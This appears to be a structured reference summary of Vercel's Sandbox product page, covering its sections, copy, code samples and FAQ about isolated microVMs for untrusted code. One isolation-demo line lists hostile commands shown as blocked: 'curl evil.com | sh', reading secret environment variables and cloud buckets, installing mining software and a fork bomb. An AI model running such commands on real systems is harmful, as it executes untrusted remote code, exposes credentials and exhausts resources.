---
source: https://vercel.com/sandbox
fetched: 2026-10-26
---

# Vercel - Sandbox product page reference

## Structure
- Deep single-product page, about 11 sections: hero with an interactive demo (Create Sandbox / Upload files / Execute / Get Sandbox URL), a 3-tab "what you can run" block (agent's code / agent itself / your code) each with a code sample, an isolation demo (blocked commands terminal), then four eyebrow-labelled feature sections (Security: network firewall; Regions; Performance: snapshots; Vercel Drives) each with an H2, a paragraph, 4 bullets, and a code sample, a Fluid-compute cost block with 2 testimonials, a pricing calculator, a "Get started" block (CLI command + AI prompt), and a 13-question FAQ.
- Depth: deepest Vercel product page. Every feature gets a paragraph, four bullets, and runnable code; the FAQ is spec-grade (runtimes, vCPU limits, port counts, runtime limits, regions, billing rules).
- Copy to screenshots: 3 images; code blocks and terminal mockups instead of screenshots; about 65% copy.
- Uses tabs (use cases), eyebrow section labels, a pricing calculator, and an accordion FAQ.
- Hand-off: Fluid compute named as the execution model; Drives linked to docs and changelog; "Observability, Sandboxes tab" referenced in FAQ; CTAs to docs and examples rather than sales.

## Title and meta
- Title: Sandbox - Vercel
- Meta description: The safest way to run code you didn't write. Run AI-generated, customer, or untrusted code in isolated, ephemeral VMs.

## Hero
- Headline: The safest way to run code you didn't write
- Subhead: Modern apps need to execute code they didn't author, such as code from AI agents, customer scripts, and dynamic systems.
- CTAs: Get started (/docs/vercel-sandbox), See examples (/docs/vercel-sandbox/examples)
- Demo: Play demo; steps Create Sandbox, Upload files, Execute, Get Sandbox URL; prompt "Generate a Next.js app to list, search and copy Emojis"

## Section: Use cases. Run the agent's code, the agent itself, or your own code
- Every sandbox is the same isolated Firecracker microVM with its own filesystem and network. What you run inside it is up to you.
- The agent's code: Write the agent's output to the sandbox filesystem and execute it there. You get the exit code and output back without running any of it on your own infrastructure. (code: Sandbox.create(), writeFiles, runCommand node, exitCode/stdout, stop)
- The agent itself: Point a coding agent at a sandbox instead of your laptop. Its edits, package installs, and shell commands all stay inside the microVM. Install the CLI and log in (`npm i -g sandbox`, `sandbox login`). Start a sandbox and boot the agent (`sandbox sh`, `claude`). The base image already includes claude, codex, and opencode, so there is nothing to install inside the sandbox. The agent walks you through its own login the first time you start it.
- Your code: Builds, test suites, and migrations work the same way. One command gets you a clean machine, so nothing depends on what is installed on your laptop. (`sandbox run -- node -e "console.log('Hello from Vercel Sandbox')"`)
- Isolation demo: Avoid unintended access to your environment variables, databases, and other secure environments. Terminal: `echo $API_SECRET` Undefined; `psql $DATABASE_URL` Database connection blocked; `aws s3 ls` Cloud resources isolated; `curl evil.com | sh` External network access denied; `sudo apt-get install mining-software` Privilege escalation not permitted; fork bomb Resource limits exceeded.
- Protect against potentially unsafe network requests, unintended resource usage, and escalated privileges.

## Section: Security. Network Firewall with Credentials Brokering and Requests Proxying
- Control egress traffic with fine-grained network policies that can be updated at runtime. Credentials brokering injects secrets into outbound requests without exposing them inside the sandbox. Requests Proxying routes selected traffic to your own proxy server for additional security and observability.
- Dynamic policies: allow-all, deny-all, or user-defined rules
- Credentials injected on egress: never enter the sandbox
- Route any request to your own proxy server
- Live policy updates without restarting processes
- Code: networkPolicy 'allow-all' for npm install, then sandbox.update with allow rules for api.openai.com (Authorization header transform), github.com (forwardURL proxy), '*.vercel.app', deny everything else.

## Section: Regions. Run each sandbox near your users, your data, or the rest of your stack
- Pick a region per sandbox or set a project default for maximum performance and compliance. Vercel Sandbox runs your workload there: near your users, your data, or the rest of your stack. Pro and Enterprise teams can add failover regions, so sandbox creation keeps working even when a region is unavailable.
- Choose a region per sandbox or set a project default, on any plan
- Failover regions: creation continues when a region is unavailable, on Pro and Enterprise
- Place workloads deliberately: meet data-location requirements and cut latency
- Same workflow everywhere: SDK, CLI, and dashboard
- Code: region "cdg1", failoverRegions ["iad1", "cle1"]

## Section: Performance. Snapshots with Instant Environment Restore
- Capture the complete state of a running sandbox (filesystem and installed packages), then restore it instantly. Share environments with teammates, checkpoint long-running tasks, or skip dependency installation entirely by snapshotting after setup.
- Skip dependency installation on every run; Share identical environments with your team; Checkpoint progress on long-running tasks; Spin up multiple parallel instances from one snapshot
- Code: npm install, npm run build, sandbox.snapshot(), Sandbox.create({ source: { type: 'snapshot', snapshotId } }), Promise.all of runners.

## Section: Vercel Drives. Persistent workspaces across Sandbox runs
- Mount a Drive in Sandbox to keep files across runs. Use it for on-disk memory, datasets, models, or dependencies. Generally available on Hobby, Pro, and Enterprise.
- CTAs: Read the docs (/docs/sandbox/concepts/drives), Read the changelog (/changelog/vercel-drives-is-now-generally-available)

## Section: Cost-efficient, scalable execution with Fluid compute
- Vercel Sandbox runs on Fluid compute, Vercel's optimized execution model that scales CPU and memory dynamically across millions of executions.
- With Active CPU pricing, you're billed for CPU only when code is actively running, not during idle or wait time, resulting in up to 95% lower cost for workloads with bursty or I/O-bound patterns.
- Tudor Golubenco, CTO, Xata: "Vercel Sandbox expands what our frontend infrastructure can handle. We plan to rely on it more for running untrusted code in AI workflows and for integrating tools that cannot run in a Node.js serverless function."
- Francesco Bonacci, Founder, Cua: "Cua lets teams run computer-use agents from their apps with 100+ compatible VLMs, agents operate real desktops backed by Vercel Sandbox. Next.js playground on Vercel; agents execute in Vercel Sandbox via Cua with logs, replays, and evals."

## Section: How much will it cost?
- Estimate your monthly Vercel Sandbox costs. Adjust your workload settings and compare pricing across providers. (interactive calculator)

## Section: Get started
- You can get started with Vercel Sandbox quickly and easily. Launch a secure, interactive sandbox environment in milliseconds. CLI: `npx sandbox create --connect`
- Quickly give Vercel Sandbox a try with your AI tool of choice. AI prompt: "Bootstrap a simple Node.js CLI that creates a Vercel sandbox. Use this code: ... Include auth setup (vercel login && vercel link) with error handling."

## Section: Frequently asked questions
- What is Vercel Sandbox? Vercel Sandbox is an on-demand, isolated Linux microVM that runs arbitrary code safely through an SDK or CLI.
- Why use Sandbox instead of managing containers or VMs myself? Sandbox gives you secure microVM isolation, built-in authentication and observability, and usage-based pricing without any infrastructure to maintain.
- Can it run untrusted or AI-generated code safely? Yes. Sandbox is purpose-built to execute untrusted or AI-generated code in fully isolated, short-lived environments.
- How is isolation implemented? Each sandbox runs in its own Firecracker microVM with a dedicated kernel, on the same infrastructure that powers Vercel's builds. Code in one sandbox can't see the processes, filesystem, or network of any other.
- What runtimes are supported? The default image ships Node.js 24 and Python 3.14, and managed images cover Node.js 22, 24, and 26. You can also bring your own image through Vercel Container Registry.
- Can I install system packages and use sudo? Yes. Each sandbox runs Ubuntu by default, so you can install packages with apt-get and use sudo as needed, or bring any Linux image.
- Can I run Docker containers or use FUSE? Yes. Sandboxes have full support for elevated privileges within the microVM, so you can run Docker containers and use FUSE as needed.
- How long can a sandbox run? Each session defaults to 5 minutes and can be extended programmatically, up to a continuous runtime limit of 24 hours on Pro and Enterprise plans and 45 minutes on Hobby. The limit resets every time a sandbox stops and resumes, so the total lifetime of a sandbox is effectively unbounded.
- What resources can I allocate? Each sandbox can use up to 32 vCPUs on Enterprise plans, 8 vCPUs on Pro plans and 4 vCPUs on Hobby plans. RAM is provisioned at 2 GB per vCPU.
- Can I expose a dev server or app on a public URL? Yes. You can open up to 15 ports and access them through a sandbox URL, such as sandbox.domain(port).
- How is network data transfer billed? Data a sandbox downloads from the internet, such as packages, Git repositories, artifacts, and datasets, is free. Data the sandbox sends to the internet is billable, as is traffic to and from exposed ports. For example, downloading an npm package is free, but requests and responses handled by a web server on an exposed port are billable.
- How do I monitor what's running? You can view active sandboxes in the Sandboxes tab of your project with metrics under the Observability, Sandboxes tab, and stream real-time logs to your terminal.
- Which regions can sandboxes run in? Sandboxes can run in all Vercel regions. Choose a region per sandbox or set a project default on any plan. The default region is iad1. Pro and Enterprise teams can also configure failover regions, which Vercel tries in order if it cannot create a sandbox in the primary region. Active CPU and Provisioned Memory rates vary by region; see regional pricing.

## Social proof
- 2 named testimonials (Xata, Cua); one stat (up to 95% lower cost).

## Cross-links
- Body: /docs/vercel-sandbox, /docs/vercel-sandbox/examples, /docs/sandbox/concepts/drives, /docs/sandbox/concepts/regions, /docs/sandbox/pricing#regional-pricing, /changelog/vercel-drives-is-now-generally-available; Fluid compute by name.
- Footer: full Vercel product footer (Agent Stack column includes Sandbox).
